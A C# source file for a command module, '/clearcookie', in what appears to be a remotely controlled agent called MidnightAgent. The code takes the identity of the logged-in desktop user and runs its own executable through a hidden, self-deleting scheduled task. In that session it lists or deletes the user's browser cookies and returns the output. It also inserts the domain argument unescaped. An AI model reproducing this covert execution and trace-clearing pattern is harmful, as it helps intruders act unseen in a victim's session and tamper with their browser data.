using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace MidnightAgent.Features
{
    public class ClearCookieFeature : IFeature
    {
        public string Command => "clearcookie";
        public string Description => "Clear cookies for specific domain (or list domains)";
        public string Usage => "/clearcookie [domain]";

        private const string TASK_NAME = "MidnightCookieCleaner";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            string outputLog = Path.Combine(Path.GetTempPath(), $"cookie_log_{Guid.NewGuid():N}.txt");

            try
            {
                // Prepare arguments for worker
                string workerArgs;
                if (args.Length > 0 && !string.IsNullOrEmpty(args[0]))
                {
                    // delete mode
                    string domain = args[0];
                    workerArgs = $"--cookie-delete \"{domain}\" \"{outputLog}\"";
                }
                else
                {
                    // list mode
                    workerArgs = $"--cookie-list \"{outputLog}\"";
                }

                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                
                // Run as user
                if (RunAsUser(exePath, workerArgs))
                {
                    // Wait for log file
                    for (int i = 0; i < 30; i++)
                    {
                        Thread.Sleep(500);
                        if (File.Exists(outputLog))
                        {
                            // Wait a bit more for file write to complete
                            Thread.Sleep(500); 
                            string content = File.ReadAllText(outputLog);
                            File.Delete(outputLog);
                            return Task.FromResult(FeatureResult.Ok(content));
                        }
                    }
                    return Task.FromResult(FeatureResult.Fail("Timeout waiting for cookie manager."));
                }

                return Task.FromResult(FeatureResult.Fail("Failed to start cookie manager task."));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error: {ex.Message}"));
            }
        }

        private bool RunAsUser(string exePath, string args)
        {
            try
            {
                string loggedInUser = GetLoggedInUser();
                if (string.IsNullOrEmpty(loggedInUser)) return false;

                string xmlPath = Path.Combine(Path.GetTempPath(), $"task_{Guid.NewGuid():N}.xml");
                string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo><Description>Cookie Cleaning Service</Description></RegistrationInfo>
  <Triggers><TimeTrigger><StartBoundary>2020-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>{loggedInUser}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT2M</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>""{exePath}""</Command>
      <Arguments>{args}</Arguments>
    </Exec>
  </Actions>
</Task>";
                File.WriteAllText(xmlPath, taskXml);

                RunSchtasks($"/Create /XML \"{xmlPath}\" /TN \"{TASK_NAME}\" /F");
                RunSchtasks($"/Run /TN \"{TASK_NAME}\"");
                
                Task.Delay(3000).ContinueWith(_ => {
                     try { File.Delete(xmlPath); } catch { }
                     try { RunSchtasks($"/Delete /TN \"{TASK_NAME}\" /F"); } catch { }
                });

                return true;
            }
            catch { return false; }
        }

        private string GetLoggedInUser()
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName("explorer"))
                {
                   string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {proc.Id}";
                   using (var searcher = new System.Management.ManagementObjectSearcher(query))
                   {
                       foreach (System.Management.ManagementObject obj in searcher.Get())
                       {
                           string[] ownerInfo = new string[] { string.Empty, string.Empty };
                           if (Convert.ToInt32(obj.InvokeMethod("GetOwner", ownerInfo)) == 0)
                           {
                               return string.IsNullOrEmpty(ownerInfo[1]) ? ownerInfo[0] : $"{ownerInfo[1]}\\{ownerInfo[0]}";
                           }
                       }
                   }
                }
            }
            catch { }
            return null;
        }

        private void RunSchtasks(string arguments)
        {
            using (var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true
            }))
            {
                proc?.WaitForExit(3000);
            }
        }
    }
}
